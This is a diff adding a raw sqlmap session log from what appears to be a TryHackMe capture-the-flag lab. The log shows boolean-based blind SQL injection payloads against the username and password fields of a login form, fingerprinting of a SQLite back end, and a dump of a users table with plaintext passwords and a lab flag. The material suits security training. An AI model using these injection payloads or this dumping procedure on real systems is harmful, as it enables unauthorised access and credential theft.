@@ -1,0 +1,168 @@
+        ___
+       __H__
+ ___ ___[(]_____ ___ ___  {1.5.3#stable}
+|_ -| . [)]     | .'| . |
+|___|_  [.]_|_|_|__,|  _|
+      |_|V...       |_|   http://sqlmap.org
+
+[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
+
+[*] starting @ 19:14:48 /2021-03-24/
+
+[19:14:48] [INFO] testing connection to the target URL
+[19:14:50] [INFO] testing if the target URL content is stable
+[19:14:50] [INFO] target URL content is stable
+[19:14:50] [INFO] testing if POST parameter 'username' is dynamic
+[19:14:51] [WARNING] POST parameter 'username' does not appear to be dynamic
+[19:14:52] [WARNING] heuristic (basic) test shows that POST parameter 'username' might not be injectable
+[19:14:53] [INFO] testing for SQL injection on POST parameter 'username'
+[19:14:53] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
+[19:14:53] [WARNING] reflective value(s) found and filtering out
+got a 302 redirect to 'http://10.10.91.78:5000/challenge3/home'. Do you want to follow? [Y/n] redirect is a result of a POST request. Do you want to resend original POST data to a new location? [y/N] [19:16:15] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause'
+[19:16:20] [INFO] POST parameter 'username' appears to be 'OR boolean-based blind - WHERE or HAVING clause' injectable (with --code=302)
+[19:16:20] [WARNING] in OR boolean-based injection cases, please consider usage of switch '--drop-set-cookie' if you experience any problems during data retrieval
+[19:16:20] [INFO] checking if the injection point on POST parameter 'username' is a false positive
+POST parameter 'username' is vulnerable. Do you want to keep testing the others (if any)? [y/N] [19:18:34] [WARNING] POST parameter 'password' does not appear to be dynamic
+[19:18:35] [WARNING] heuristic (basic) test shows that POST parameter 'password' might not be injectable
+[19:18:36] [INFO] testing for SQL injection on POST parameter 'password'
+[19:18:36] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
+[19:19:49] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause'
+[19:19:54] [INFO] POST parameter 'password' appears to be 'OR boolean-based blind - WHERE or HAVING clause' injectable 
+[19:19:54] [WARNING] in OR boolean-based injection cases, please consider usage of switch '--drop-set-cookie' if you experience any problems during data retrieval
+[19:19:54] [INFO] checking if the injection point on POST parameter 'password' is a false positive
+POST parameter 'password' is vulnerable. Do you want to keep testing the others (if any)? [y/N] [19:20:28] [WARNING] parameter 'User-Agent' does not appear to be dynamic
+[19:20:29] [WARNING] heuristic (basic) test shows that parameter 'User-Agent' might not be injectable
+[19:20:30] [INFO] testing for SQL injection on parameter 'User-Agent'
+[19:20:30] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
+[19:21:09] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause'
+[19:22:10] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (NOT)'
+[19:22:45] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (subquery - comment)'
+[19:23:12] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (subquery - comment)'
+[19:23:49] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (comment)'
+[19:23:54] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (comment)'
+[19:24:05] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (NOT - comment)'
+[19:24:11] [INFO] testing 'Boolean-based blind - Parameter replace (original value)'
+[19:24:12] [INFO] testing 'Boolean-based blind - Parameter replace (DUAL)'
+[19:24:13] [INFO] testing 'Boolean-based blind - Parameter replace (DUAL - original value)'
+[19:24:14] [INFO] testing 'Boolean-based blind - Parameter replace (CASE)'
+[19:24:14] [INFO] testing 'Boolean-based blind - Parameter replace (CASE - original value)'
+[19:24:15] [INFO] testing 'HAVING boolean-based blind - WHERE, GROUP BY clause'
+[19:24:43] [WARNING] parameter 'User-Agent' does not seem to be injectable
+[19:24:43] [WARNING] parameter 'Referer' does not appear to be dynamic
+[19:24:44] [WARNING] heuristic (basic) test shows that parameter 'Referer' might not be injectable
+[19:24:44] [INFO] testing for SQL injection on parameter 'Referer'
+[19:24:44] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
+[19:25:58] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause'
+[19:26:59] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (NOT)'
+[19:28:10] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (subquery - comment)'
+[19:29:03] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (subquery - comment)'
+[19:29:37] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (comment)'
+[19:29:50] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (comment)'
+[19:30:01] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (NOT - comment)'
+[19:30:15] [INFO] testing 'Boolean-based blind - Parameter replace (original value)'
+[19:30:17] [INFO] testing 'Boolean-based blind - Parameter replace (DUAL)'
+[19:30:18] [INFO] testing 'Boolean-based blind - Parameter replace (DUAL - original value)'
+[19:30:20] [INFO] testing 'Boolean-based blind - Parameter replace (CASE)'
+[19:30:21] [INFO] testing 'Boolean-based blind - Parameter replace (CASE - original value)'
+[19:30:23] [INFO] testing 'HAVING boolean-based blind - WHERE, GROUP BY clause'
+[19:31:17] [WARNING] parameter 'Referer' does not seem to be injectable
+[19:31:17] [WARNING] parameter 'Host' does not appear to be dynamic
+[19:31:18] [WARNING] heuristic (basic) test shows that parameter 'Host' might not be injectable
+[19:31:19] [INFO] testing for SQL injection on parameter 'Host'
+[19:31:19] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
+[19:31:57] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause'
+[19:32:55] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (NOT)'
+[19:33:31] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (subquery - comment)'
+[19:34:02] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (subquery - comment)'
+[19:34:45] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (comment)'
+[19:34:53] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (comment)'
+[19:35:06] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (NOT - comment)'
+[19:35:13] [INFO] testing 'Boolean-based blind - Parameter replace (original value)'
+[19:35:14] [INFO] testing 'Boolean-based blind - Parameter replace (DUAL)'
+[19:35:15] [INFO] testing 'Boolean-based blind - Parameter replace (DUAL - original value)'
+[19:35:16] [INFO] testing 'Boolean-based blind - Parameter replace (CASE)'
+[19:35:16] [INFO] testing 'Boolean-based blind - Parameter replace (CASE - original value)'
+[19:35:17] [INFO] testing 'HAVING boolean-based blind - WHERE, GROUP BY clause'
+[19:35:47] [WARNING] parameter 'Host' does not seem to be injectable
+sqlmap identified the following injection point(s) with a total of 1516 HTTP(s) requests:
+---
+Parameter: password (POST)
+    Type: boolean-based blind
+    Title: OR boolean-based blind - WHERE or HAVING clause
+    Payload: username=admin&password=-5995' OR 7339=7339-- Qdfo
+
+Parameter: username (POST)
+    Type: boolean-based blind
+    Title: OR boolean-based blind - WHERE or HAVING clause
+    Payload: username=-7387' OR 8206=8206-- cmIG&password=admin
+---
+there were multiple injection points, please select the one to use for following injections:
+[0] place: POST, parameter: username, type: Single quoted string (default)
+[1] place: POST, parameter: password, type: Single quoted string
+[q] Quit
+> [19:42:03] [INFO] testing SQLite
+[19:42:04] [INFO] confirming SQLite
+[19:42:05] [INFO] actively fingerprinting SQLite
+[19:42:06] [INFO] the back-end DBMS is SQLite
+back-end DBMS: SQLite
+[19:42:06] [INFO] fetching tables for database: 'SQLite_masterdb'
+[19:42:06] [INFO] fetching number of tables for database 'SQLite_masterdb'
+[19:42:06] [WARNING] running in a single-thread mode. Please consider usage of option '--threads' for faster data retrieval
+
+[19:42:06] [INFO] retrieved: 1
+
+[19:42:10] [INFO] retrieved: users
+
+[19:42:34] [INFO] retrieved: CREATE TABLE users (     id integer primary key,     username text unique not null,     password text not null )
+[19:52:37] [INFO] fetching entries for table 'users'
+[19:52:37] [INFO] fetching number of entries for table 'users' in database 'SQLite_masterdb'
+
+[19:52:37] [INFO] retrieved: 5
+
+[19:52:43] [INFO] retrieved: 1
+
+[19:52:49] [INFO] retrieved: THM{f1f4e0757a09a0b87eeb2f33bca6a5cb}
+
+[19:56:08] [INFO] retrieved: admin
+
+[19:56:32] [INFO] retrieved: 3
+
+[19:56:38] [INFO] retrieved: asd
+
+[19:56:54] [INFO] retrieved: amanda
+
+[19:57:23] [INFO] retrieved: 2
+
+[19:57:29] [INFO] retrieved: Summer2019!
+
+[19:58:26] [INFO] retrieved: dev
+
+[19:58:42] [INFO] retrieved: 5
+
+[19:58:48] [INFO] retrieved: 345m3io4hj3
+
+[19:59:46] [INFO] retrieved: emil
+
+[20:00:06] [INFO] retrieved: 4
+
+[20:00:11] [INFO] retrieved: viking123
+
+[20:00:58] [INFO] retrieved: maja
+Database: <current>
+Table: users
+[5 entries]
++----+---------------------------------------+----------+
+| id | password                              | username |
++----+---------------------------------------+----------+
+| 1  | THM{f1f4e0757a09a0b87eeb2f33bca6a5cb} | admin    |
+| 3  | asd                                   | amanda   |
+| 2  | Summer2019!                           | dev      |
+| 5  | 345m3io4hj3                           | emil     |
+| 4  | viking123                             | maja     |
++----+---------------------------------------+----------+
+
+[20:01:18] [INFO] table 'SQLite_masterdb.users' dumped to CSV file '/home/avik/.local/share/sqlmap/output/10.10.91.78/dump/SQLite_masterdb/users.csv'
+[20:01:18] [INFO] fetched data logged to text files under '/home/avik/.local/share/sqlmap/output/10.10.91.78'
+
+[*] ending @ 20:01:18 /2021-03-24/
+
